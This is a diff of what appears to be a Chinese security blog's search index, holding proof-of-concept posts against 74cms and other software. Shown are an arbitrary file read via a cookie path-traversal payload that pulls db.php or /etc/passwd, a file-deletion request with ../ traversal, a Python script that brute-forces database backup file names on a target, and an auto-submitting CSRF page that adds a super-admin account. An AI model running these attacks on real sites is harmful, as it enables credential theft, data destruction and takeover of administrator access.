-<h1 id="74cms-v4-2-126-任意文件读取漏洞"><a href="#74cms-v4-2-126-任意文件读取漏洞" class="headerlink" title="74cms v4.2.126-任意文件读取漏洞"></a>74cms v4.2.126-任意文件读取漏洞</h1><h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>厂商：74cms下载地址：<a href="http://www.74cms.com/download/index.html%E5%85%B3%E4%BA%8E%E7%89%88%E6%9C%AC%EF%BC%9A%E6%96%B0%E7%89%88%E7%9A%8474cms%E9%87%87%E7%94%A8%E4%BA%86tp3.2.3%E9%87%8D%E6%9E%84%E4%BA%86%EF%BC%8C%E6%89%80%E4%BB%A5%E5%8F%AF%E7%9F%A5%E5%BA%95%E5%B1%82%E6%98%AFtp%EF%BC%8C74cms%E6%96%B0%E7%89%88%E5%8D%87%E7%BA%A7%E6%98%AF%E5%90%8E%E5%8F%B0%E5%8D%87%E7%BA%A7%E7%9A%84%EF%BC%8C%E6%89%80%E4%BB%A5%E5%85%88%E5%B0%86%E5%B0%86%E5%8D%87%E7%BA%A7%E6%96%B9%E6%B3%95%E3%80%82%E6%B3%A8%EF%BC%9A%E6%AD%A4%E6%BC%8F%E6%B4%9E%E4%B8%8D%E7%94%A8%E5%8D%87%E7%BA%A7%E8%87%B3%E6%9C%80%E6%96%B0%E7%89%88%E6%9C%AC%E4%B9%9F%E5%8F%AF%E4%BD%BF%E7%94%A8%E3%80%82">http://www.74cms.com/download/index.html关于版本：新版的74cms采用了tp3.2.3重构了，所以可知底层是tp，74cms新版升级是后台升级的，所以先将将升级方法。注：此漏洞不用升级至最新版本也可使用。</a></p>
-<h2 id="0x01-74cms升级到最新版"><a href="#0x01-74cms升级到最新版" class="headerlink" title="0x01 74cms升级到最新版"></a>0x01 74cms升级到最新版</h2><p>1， 先去官网下载 骑士人才系统基础版(安装包)2， 将下载好的包进行安装3， 进入后台点击查看如果不是最新版的话，请点击升级！4， 如果是本地环境的话，会提示 域名不合法升级失败，这个问题很好解决5，<br>搜索文件74cms\upload\Application\Admin\Controller\ApplyController.class.php6， 查找所有$_SERVER[&#39;HTTP_HOST&#39;] 改为 <a href="http://baidu.com/">http://baidu.com</a> 即可</p>
-<h2 id="0x02-任意文件读取漏洞演示"><a href="#0x02-任意文件读取漏洞演示" class="headerlink" title="0x02 任意文件读取漏洞演示"></a>0x02 任意文件读取漏洞演示</h2><pre><code>url: http://74cms.test/index.php?m=Home&amp;c=Members&amp;a=register
-
-post: 
-reg_type=2&amp;utype=2&amp;org=bind&amp;ucenter=bind
-cookie: members_bind_info[temp_avatar]=../../../../Application/Common/Conf/db.php;members_bind_info[type]=qq;members_uc_info[password]=123456;members_uc_info[uid]=1;members_uc_info[username]=tttttt;
-headers:
-Content-Type: application/x-www-form-urlencoded
-X-Requested-With: XMLHttpRequest</code></pre>
-<p><img src="/resource/74cmsv4.2.126-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/media/rId24.png"></p>
-<p><img src="/resource/74cmsv4.2.126-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/media/rId25.png"></p>
-<p><img src="/resource/74cmsv4.2.126-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/media/rId26.png"></p>
-<p><img src="/resource/74cmsv4.2.126-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/media/rId27.png"></p>
-<p>问题一：漏洞原理？我下面会讲问题二：你如何知道文件名称的？我下面会讲问题三：能不能写个简单的工具，自动利用此漏洞？哦，好的，我下面会提供 : )</p>
-<h2 id="0x03-漏洞讲解"><a href="#0x03-漏洞讲解" class="headerlink" title="0x03 漏洞讲解"></a>0x03 漏洞讲解</h2><p>打开文件：74cms\upload\Application\Home\Controller\MembersController.class.php函数：_save_avatar($avatar, $uid)</p>
-<p><img src="/resource/74cmsv4.2.126-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/media/rId29.png"></p>
-<p>如果不想看图片注释的话，我这里简单的说一下。812行使用$avatar拼接形成$path830行使用了$save_avatar+$savePicName; 生成了$filename838行，使用了copy函数，把$path文件内容复制到了$filename中。而 $avatar 和 $uid 都是我们刚好可以控制的变量并且生成的文件名称是$uid+time() 然后md5 一下 拼接 .jpg这个情况就很舒服了。写个小工具跑一下就好了，小工具会在结尾的时候放出来的。好了，让我们继续看下去 : )我们现在既然已经知道了_save_avatar<br>函数是有可能造成此漏洞的那么这时，我们就需要去找调用它的地方了。经过一顿的搜索我们得出了两个地方是调用了他地方一：register() 方法 会员注册方法地方二：oauth_reg() 方法 第三方登录注册方法论此漏洞的利用当然是register() 方法利用起来比较简单 因为 方法二<br>需要搭建第三方登录，我本地的话。。。还是算了，这里掩饰我使用 方法一打开文件：74cms\upload\Application\Home\Controller\MembersController.class.php函数：register()</p>
-<p><img src="/resource/74cmsv4.2.126-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/media/rId30.png"></p>
-<p>上面的马赛克是因为我写错了几个字，又不想重新写，所以我就把他擦掉了。皮这一下，我就很开心</p>
-<p><img src="/resource/74cmsv4.2.126-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/media/rId31.png"></p>
-<p>这里我们讲解一下如果<br>post的变量ucenter为bind时，则通过cookie获取数组$uc_user接着会进行数组合并而members_uc_info的cookie值是可控的，所以$data也是可控的。</p>
-<p><img src="/resource/74cmsv4.2.126-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/media/rId32.png"></p>
-<p>这里写着 当 $data[utype] = 1<br>会进行用户注册，而$data[utype]是我们可以控制的所以我们为2绕过此判断这里我又跳过了前面一些无关紧要的内容，来到了最后的漏洞触发点。因为真的无关紧要,所以就跳过了</p>
-<p><img src="/resource/74cmsv4.2.126-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/media/rId33.png"></p>
-<h2 id="0x04-漏洞利用小工具"><a href="#0x04-漏洞利用小工具" class="headerlink" title="0x04 漏洞利用小工具"></a>0x04 漏洞利用小工具</h2><p><a href="https://github.com/ianxtianxt/74cms-upload">https://github.com/ianxtianxt/74cms-upload</a></p>
-<p><img src="/resource/74cmsv4.2.126-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/media/rId35.png"></p>
-<p><img src="/resource/74cmsv4.2.126-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/media/rId36.png"></p>
-<h2 id="四、参考链接"><a href="#四、参考链接" class="headerlink" title="四、参考链接"></a>四、参考链接</h2><blockquote>
-<p><a href="https://www.yuque.com/pmiaowu/bfgkkh/dr895b">https://www.yuque.com/pmiaowu/bfgkkh/dr895b</a></p>
-</blockquote>
-]]></content>
-      <categories>
-        <category>Poc</category>
-      </categories>
-      <tags>
-        <tag>74cms</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>74cms v4.2.126-通杀sql注入</title>
     <url>/2021/01/12/74cms%20v4.2.126-%E9%80%9A%E6%9D%80sql%E6%B3%A8%E5%85%A5/</url>
     <content><![CDATA[<a id="more"></a>
@@ -266,28 +266,6 @@ http://74cms.test/index.php?m=&amp;c=jobs&amp;a=jobs_list&amp;lat=23.176465&amp;
 <h2 id="四、参考链接"><a href="#四、参考链接" class="headerlink" title="四、参考链接"></a>四、参考链接</h2><blockquote>
 <p><a href="https://www.yuque.com/pmiaowu/bfgkkh/iwgmb2">https://www.yuque.com/pmiaowu/bfgkkh/iwgmb2</a></p>
 </blockquote>
-]]></content>
-      <categories>
-        <category>Poc</category>
-      </categories>
-      <tags>
-        <tag>74cms</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>74cms v4.2.3 任意文件删除</title>
-    <url>/2021/01/12/74cms%20v4.2.3%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%88%A0%E9%99%A4/</url>
-    <content><![CDATA[<a id="more"></a>
-<h1 id="74cms-v4-2-3-任意文件删除"><a href="#74cms-v4-2-3-任意文件删除" class="headerlink" title="74cms v4.2.3 任意文件删除"></a>74cms v4.2.3 任意文件删除</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><pre><code>GET /index.php?m=admin&amp;c=database&amp;a=del&amp;name=/../../../../../ HTTP/1.1
-Host: 0-sec.org
-User-Agent: Mozilla/5.0 (Android 9.0; Mobile; rv:61.0) Gecko/61.0 Firefox/61.0
-Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
-Accept-Language: en
-Accept-Encoding: gzip, deflate
-Referer: http://127.0.0.1/index.php?m=admin&amp;c=database&amp;a=restore
-Connection: close
-Cookie: think_template=default; PHPSESSID=6d86a34ec9125b2d08ebbb7630838682; think_language=en
-Upgrade-Insecure-Requests: 1</code></pre>
 ]]></content>
       <categories>
         <category>Poc</category>
@@ -355,59 +333,6 @@ Upgrade-Insecure-Requests: 1</code></pre>
       </tags>
   </entry>
   <entry>
-    <title>74cms v4.2.3 备份文件爆破</title>
-    <url>/2021/01/12/74cms%20v4.2.3%20%E5%A4%87%E4%BB%BD%E6%96%87%E4%BB%B6%E7%88%86%E7%A0%B4/</url>
-    <content><![CDATA[<a id="more"></a>
-<h1 id="74cms-v4-2-3-备份文件爆破"><a href="#74cms-v4-2-3-备份文件爆破" class="headerlink" title="74cms v4.2.3 备份文件爆破"></a>74cms v4.2.3 备份文件爆破</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><pre><code># -*- coding: utf-8 -*-
--------------------------------------------------
-   File Name：     74cms_MysqlBak
-   Description :
-   Author :       CoolCat
-   date：          2019/1/5
--------------------------------------------------
-   Change Activity:
-                   2019/1/5:
--------------------------------------------------
-&quot;&quot;&quot;
-__author__ = &#39;CoolCat&#39;
-
-import requests
-
-def getBak(time):
-    print(&quot;[running]:正在查询&quot; + time + &quot;是否存在备份&quot;)
-    dir = time + &quot;_1&quot;
-    filename = dir + &quot;_1.sql&quot;
-    url = target + &quot;//data/backup/database/&quot; + dir +&quot;/&quot;+ filename
-    session = requests.Session()
-    headers = &#123;&quot;Accept&quot;: &quot;text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8&quot;,
-               &quot;Upgrade-Insecure-Requests&quot;: &quot;1&quot;,
-               &quot;User-Agent&quot;: &quot;Mozilla/5.0 (Android 9.0; Mobile; rv:61.0) Gecko/61.0 Firefox/61.0&quot;,
-               &quot;Connection&quot;: &quot;close&quot;, &quot;Accept-Language&quot;: &quot;en&quot;, &quot;Accept-Encoding&quot;: &quot;gzip, deflate&quot;&#125;
-    cookies = &#123;&quot;think_language&quot;: &quot;en&quot;, &quot;think_template&quot;: &quot;default&quot;, &quot;PHPSESSID&quot;: &quot;6d86a34ec9125b2d08ebbb7630838682&quot;&#125;
-    response = session.get(url=url, headers=headers, cookies=cookies)
-    if response.status_code == 200:
-        print(url)
-        exit()
-
-if __name__ == &#39;__main__&#39;:
-
-    global target
-    target = &quot;http://www.target.com&quot;
-
-    for year in range(2017, 2020):
-        for mouth in range(1, 13):
-            for day in range(1, 31):
-                time = (str(year) + str(&#39;%02d&#39; % mouth) + str(&#39;%02d&#39; % day))
-                getBak(time)</code></pre>
-]]></content>
-      <categories>
-        <category>Poc</category>
-      </categories>
-      <tags>
-        <tag>74cms</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>74cms v4.2.3任意文件读取</title>
     <url>/2021/01/12/74cms%20v4.2.3%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/</url>
     <content><![CDATA[<a id="more"></a>
@@ -444,6 +369,28 @@ ajax=1&amp;reg_type=2&amp;utype=2&amp;org=bind&amp;ucenter=bind</code></pre>
 <p>是读取db.php，如果想读取根目录可以构造</p>
 <p>../../../../../../../../etc/passwd</p>
 <h6 id="时间戳问题"><a href="#时间戳问题" class="headerlink" title="时间戳问题"></a>时间戳问题</h6><p>服务器返回的时间，服务器返回的是GMT格林威治标准时间，没有加上时区，只记录分秒即可</p>
+]]></content>
+      <categories>
+        <category>Poc</category>
+      </categories>
+      <tags>
+        <tag>74cms</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>74cms v4.2.3 任意文件删除</title>
+    <url>/2021/01/12/74cms%20v4.2.3%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%88%A0%E9%99%A4/</url>
+    <content><![CDATA[<a id="more"></a>
+<h1 id="74cms-v4-2-3-任意文件删除"><a href="#74cms-v4-2-3-任意文件删除" class="headerlink" title="74cms v4.2.3 任意文件删除"></a>74cms v4.2.3 任意文件删除</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><pre><code>GET /index.php?m=admin&amp;c=database&amp;a=del&amp;name=/../../../../../ HTTP/1.1
+Host: 0-sec.org
+User-Agent: Mozilla/5.0 (Android 9.0; Mobile; rv:61.0) Gecko/61.0 Firefox/61.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en
+Accept-Encoding: gzip, deflate
+Referer: http://127.0.0.1/index.php?m=admin&amp;c=database&amp;a=restore
+Connection: close
+Cookie: think_template=default; PHPSESSID=6d86a34ec9125b2d08ebbb7630838682; think_language=en
+Upgrade-Insecure-Requests: 1</code></pre>
 ]]></content>
       <categories>
         <category>Poc</category>
@@ -659,6 +606,59 @@ Cache-Control: max-age=0</code></pre>
 <h2 id="四、参考链接"><a href="#四、参考链接" class="headerlink" title="四、参考链接"></a>四、参考链接</h2><blockquote>
 <p><a href="https://github.com/kyrie403/Vuln/blob/master/74cms/74cms%20v5.0.1%20remote%20code%20execution.md">https://github.com/kyrie403/Vuln/blob/master/74cms/74cms%20v5.0.1%20remote%20code%20execution.md</a></p>
 </blockquote>
+]]></content>
+      <categories>
+        <category>Poc</category>
+      </categories>
+      <tags>
+        <tag>74cms</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>74cms v4.2.3 备份文件爆破</title>
+    <url>/2021/01/12/74cms%20v4.2.3%20%E5%A4%87%E4%BB%BD%E6%96%87%E4%BB%B6%E7%88%86%E7%A0%B4/</url>
+    <content><![CDATA[<a id="more"></a>
+<h1 id="74cms-v4-2-3-备份文件爆破"><a href="#74cms-v4-2-3-备份文件爆破" class="headerlink" title="74cms v4.2.3 备份文件爆破"></a>74cms v4.2.3 备份文件爆破</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><pre><code># -*- coding: utf-8 -*-
+-------------------------------------------------
+   File Name：     74cms_MysqlBak
+   Description :
+   Author :       CoolCat
+   date：          2019/1/5
+-------------------------------------------------
+   Change Activity:
+                   2019/1/5:
+-------------------------------------------------
+&quot;&quot;&quot;
+__author__ = &#39;CoolCat&#39;
+
+import requests
+
+def getBak(time):
+    print(&quot;[running]:正在查询&quot; + time + &quot;是否存在备份&quot;)
+    dir = time + &quot;_1&quot;
+    filename = dir + &quot;_1.sql&quot;
+    url = target + &quot;//data/backup/database/&quot; + dir +&quot;/&quot;+ filename
+    session = requests.Session()
+    headers = &#123;&quot;Accept&quot;: &quot;text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8&quot;,
+               &quot;Upgrade-Insecure-Requests&quot;: &quot;1&quot;,
+               &quot;User-Agent&quot;: &quot;Mozilla/5.0 (Android 9.0; Mobile; rv:61.0) Gecko/61.0 Firefox/61.0&quot;,
+               &quot;Connection&quot;: &quot;close&quot;, &quot;Accept-Language&quot;: &quot;en&quot;, &quot;Accept-Encoding&quot;: &quot;gzip, deflate&quot;&#125;
+    cookies = &#123;&quot;think_language&quot;: &quot;en&quot;, &quot;think_template&quot;: &quot;default&quot;, &quot;PHPSESSID&quot;: &quot;6d86a34ec9125b2d08ebbb7630838682&quot;&#125;
+    response = session.get(url=url, headers=headers, cookies=cookies)
+    if response.status_code == 200:
+        print(url)
+        exit()
+
+if __name__ == &#39;__main__&#39;:
+
+    global target
+    target = &quot;http://www.target.com&quot;
+
+    for year in range(2017, 2020):
+        for mouth in range(1, 13):
+            for day in range(1, 31):
+                time = (str(year) + str(&#39;%02d&#39; % mouth) + str(&#39;%02d&#39; % day))
+                getBak(time)</code></pre>
 ]]></content>
       <categories>
         <category>Poc</category>
@@ -896,48 +896,6 @@ end</code></pre>
       </tags>
   </entry>
   <entry>
-    <title>（CVE-2019-11374）74cms v5.0.1 后台跨站请求伪造(CSRF)漏洞</title>
-    <url>/2021/01/12/%EF%BC%88CVE-2019-11374%EF%BC%8974cms%20v5.0.1%20%E5%90%8E%E5%8F%B0%E8%B7%A8%E7%AB%99%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0(CSRF)%E6%BC%8F%E6%B4%9E/</url>
-    <content><![CDATA[<a id="more"></a>
-
-<h1 id="（CVE-2019-11374）74cms-v5-0-1-后台跨站请求伪造-CSRF-漏洞"><a href="#（CVE-2019-11374）74cms-v5-0-1-后台跨站请求伪造-CSRF-漏洞" class="headerlink" title="（CVE-2019-11374）74cms v5.0.1 后台跨站请求伪造(CSRF)漏洞"></a>（CVE-2019-11374）74cms v5.0.1 后台跨站请求伪造(CSRF)漏洞</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><p>在74CMS<br>v5.0.1后台存在一个跨站请求伪造(CSRF)漏洞，该漏洞url：<code>/index.php?m=admin&amp;c=admin&amp;a=add</code>攻击者可以利用该漏洞诱骗管理员点击恶意页面，从而任意添加一个后台管理员账户，达到进入后台，获得一个后台管理员角色的控制权。</p>
-<h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><p>74CMS v5.0.1</p>
-<h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><p>首先我们登录后台页面，并添加管理员，然后添加信息，用burp_suite抓包</p>
-<p>1.png</p>
-<p>当管理员登录后台后，点击攻击者发来的连接即可创建一个新的超级管理员账户</p>
-<p>2.png</p>
-<pre><code>&lt;!DOCTYPE html&gt;
-&lt;html&gt;
-  &lt;head&gt;
-  &lt;title&gt; CSRF &lt;/title&gt;
-  &lt;script type=&quot;text/javascript&quot;&gt;
-    function exec1()&#123;
-      document.getElementById(&#39;form1&#39;).submit();
-    &#125;
-  &lt;/script&gt;
-  &lt;/head&gt;
-  &lt;body onload=&quot;exec1();&quot;&gt;
-    &lt;form id=&quot;form1&quot; action=&quot;https://www.0-sec.org.com/index.php?m=Admin&amp;c=admin&amp;a=add&quot; method=&quot;POST&quot;&gt;
-      &lt;input type=&quot;hidden&quot; name=&quot;username&quot; value=&quot;admin688&quot; /&gt;
-  &lt;input type=&quot;hidden&quot; name=&quot;email&quot; value=&quot;111111111@qq.com&quot; /&gt;
-      &lt;input type=&quot;hidden&quot; name=&quot;password&quot; value=&quot;admin688&quot; /&gt;
-      &lt;input type=&quot;hidden&quot; name=&quot;repassword&quot; value=&quot;admin688&quot; /&gt;  
-  &lt;input type=&quot;hidden&quot; name=&quot;role_id&quot; value=&quot;1&quot; /&gt;
-    &lt;/form&gt;
-  &lt;/body&gt;
-&lt;/html&gt;</code></pre>
-<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><blockquote>
-<p><a href="https://www.023niu.com/show-62-32-1.html">https://www.023niu.com/show-62-32-1.html</a></p>
-</blockquote>
-]]></content>
-      <categories>
-        <category>Poc</category>
-      </categories>
-      <tags>
-        <tag>74cms</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>（CVE-2016-3088）ActiveMQ应用漏洞</title>
     <url>/2021/01/12/%EF%BC%88CVE-2016-3088%EF%BC%89ActiveMQ%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/</url>
     <content><![CDATA[<a id="more"></a>
@@ -1005,6 +963,48 @@ shell</code></pre>
       </categories>
       <tags>
         <tag>ApacheMQ</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>（CVE-2019-11374）74cms v5.0.1 后台跨站请求伪造(CSRF)漏洞</title>
+    <url>/2021/01/12/%EF%BC%88CVE-2019-11374%EF%BC%8974cms%20v5.0.1%20%E5%90%8E%E5%8F%B0%E8%B7%A8%E7%AB%99%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0(CSRF)%E6%BC%8F%E6%B4%9E/</url>
+    <content><![CDATA[<a id="more"></a>
+
+<h1 id="（CVE-2019-11374）74cms-v5-0-1-后台跨站请求伪造-CSRF-漏洞"><a href="#（CVE-2019-11374）74cms-v5-0-1-后台跨站请求伪造-CSRF-漏洞" class="headerlink" title="（CVE-2019-11374）74cms v5.0.1 后台跨站请求伪造(CSRF)漏洞"></a>（CVE-2019-11374）74cms v5.0.1 后台跨站请求伪造(CSRF)漏洞</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><p>在74CMS<br>v5.0.1后台存在一个跨站请求伪造(CSRF)漏洞，该漏洞url：<code>/index.php?m=admin&amp;c=admin&amp;a=add</code>攻击者可以利用该漏洞诱骗管理员点击恶意页面，从而任意添加一个后台管理员账户，达到进入后台，获得一个后台管理员角色的控制权。</p>
+<h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><p>74CMS v5.0.1</p>
+<h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><p>首先我们登录后台页面，并添加管理员，然后添加信息，用burp_suite抓包</p>
+<p>1.png</p>
+<p>当管理员登录后台后，点击攻击者发来的连接即可创建一个新的超级管理员账户</p>
+<p>2.png</p>
+<pre><code>&lt;!DOCTYPE html&gt;
+&lt;html&gt;
+  &lt;head&gt;
+  &lt;title&gt; CSRF &lt;/title&gt;
+  &lt;script type=&quot;text/javascript&quot;&gt;
+    function exec1()&#123;
+      document.getElementById(&#39;form1&#39;).submit();
+    &#125;
+  &lt;/script&gt;
+  &lt;/head&gt;
+  &lt;body onload=&quot;exec1();&quot;&gt;
+    &lt;form id=&quot;form1&quot; action=&quot;https://www.0-sec.org.com/index.php?m=Admin&amp;c=admin&amp;a=add&quot; method=&quot;POST&quot;&gt;
+      &lt;input type=&quot;hidden&quot; name=&quot;username&quot; value=&quot;admin688&quot; /&gt;
+  &lt;input type=&quot;hidden&quot; name=&quot;email&quot; value=&quot;111111111@qq.com&quot; /&gt;
+      &lt;input type=&quot;hidden&quot; name=&quot;password&quot; value=&quot;admin688&quot; /&gt;
+      &lt;input type=&quot;hidden&quot; name=&quot;repassword&quot; value=&quot;admin688&quot; /&gt;  
+  &lt;input type=&quot;hidden&quot; name=&quot;role_id&quot; value=&quot;1&quot; /&gt;
+    &lt;/form&gt;
+  &lt;/body&gt;
+&lt;/html&gt;</code></pre>
+<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><blockquote>
+<p><a href="https://www.023niu.com/show-62-32-1.html">https://www.023niu.com/show-62-32-1.html</a></p>
+</blockquote>
+]]></content>
+      <categories>
+        <category>Poc</category>
+      </categories>
+      <tags>
+        <tag>74cms</tag>
       </tags>
   </entry>
   <entry>
